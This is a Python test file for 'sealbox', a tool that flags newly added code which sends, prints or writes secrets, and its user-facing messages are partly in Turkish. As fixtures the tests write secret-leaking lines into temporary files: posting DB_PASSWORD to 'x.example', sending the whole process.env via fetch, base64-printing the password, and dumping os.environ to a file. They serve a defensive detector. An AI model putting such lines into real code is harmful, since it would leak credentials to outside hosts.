import json

from sealbox.approval import changes_lines, changes_summary
from sealbox.changes import SNAPSHOT, find_risky_changes, remember

BASE = (
    'import os\nimport requests\n\nDB = os.environ["DB_PASSWORD"]\n\n\ndef ping():\n    return 1\n'
)


def project(tmp_path, text=BASE):
    (tmp_path / "app.py").write_text(text, encoding="utf-8")
    return tmp_path


def kinds(report):
    return {(f.path, r.line, r.kind, r.strong) for f in report.files for r in f.lines}


def test_first_run_has_nothing_to_compare(tmp_path):
    report = find_risky_changes(project(tmp_path), ["DB_PASSWORD"])
    assert report.first_run and not report.files


def test_unchanged_project_is_quiet(tmp_path):
    root = project(tmp_path)
    remember(root)
    report = find_risky_changes(root, ["DB_PASSWORD"])
    assert not report.first_run and not report.files


def test_new_send_line_in_a_secret_reading_file_is_strong(tmp_path):
    root = project(tmp_path)
    remember(root)
    (root / "app.py").write_text(
        BASE + '    requests.post("https://x.example", data={"p": DB})\n', encoding="utf-8"
    )
    assert kinds(find_risky_changes(root, ["DB_PASSWORD"])) == {("app.py", 9, "send", True)}


def test_send_and_print_are_told_apart(tmp_path):
    root = project(tmp_path)
    remember(root)
    (root / "other.py").write_text(
        "import base64, json, os\n"
        'print("x", os.environ["DB_PASSWORD"])\n'  # hidden in output: weak
        'print(base64.b64encode(os.environ["DB_PASSWORD"].encode()))\n'  # transformed: strong
        'open("dump.txt", "w").write(json.dumps(dict(os.environ)))\n'  # written to a file: strong
        'print("hazır")\n',  # unrelated to secrets
        encoding="utf-8",
    )
    assert kinds(find_risky_changes(root, ["DB_PASSWORD"])) == {
        ("other.py", 2, "print", False),
        ("other.py", 3, "print", True),
        ("other.py", 4, "write", True),
    }


def test_network_code_in_files_without_secrets_is_not_listed(tmp_path):
    root = project(tmp_path)
    remember(root)
    (root / "web.js").write_text('fetch("/api/items").then((r) => r.json());\n', encoding="utf-8")
    assert not find_risky_changes(root, ["DB_PASSWORD"]).files
    (root / "leak.js").write_text("fetch(url, { body: JSON.stringify(process.env) });\n", "utf-8")
    assert kinds(find_risky_changes(root, [])) == {("leak.js", 1, "send", True)}


def test_vault_name_in_another_file_counts(tmp_path):
    root = project(tmp_path)
    remember(root)
    (root / "client.py").write_text(
        "import config, requests\nrequests.get(URL, headers={'x': config.DB_PASSWORD})\n", "utf-8"
    )
    assert kinds(find_risky_changes(root, ["DB_PASSWORD"])) == {("client.py", 2, "send", True)}


def test_moved_or_reindented_lines_are_not_changes(tmp_path):
    root = project(tmp_path, BASE + 'print(os.environ["DB_PASSWORD"])\n')
    remember(root)
    text = (root / "app.py").read_text(encoding="utf-8")
    (root / "app.py").write_text('    print(os.environ["DB_PASSWORD"])\n' + text, encoding="utf-8")
    assert not find_risky_changes(root, ["DB_PASSWORD"]).files


def test_snapshot_holds_no_source_text(tmp_path):
    root = project(tmp_path)
    remember(root)
    raw = (root / ".sealbox" / SNAPSHOT).read_text(encoding="utf-8")
    assert "DB_PASSWORD" not in raw and "requests" not in raw
    assert set(json.loads(raw)["files"]) == {"app.py"}


def test_window_text(tmp_path):
    root = project(tmp_path)
    assert "İlk çalıştırma" in changes_summary(find_risky_changes(root, []))[0]
    remember(root)
    (root / "app.py").write_text(BASE + "    requests.post(URL, data=DB)\n", encoding="utf-8")
    report = find_risky_changes(root, ["DB_PASSWORD"])
    title, color = changes_summary(report)
    assert "1 dosyada riskli" in title and color == "#a33"
    assert changes_lines(report) == [
        "app.py",
        "     9  dışarı gönderiyor: requests.post(URL, data=DB)",
    ]
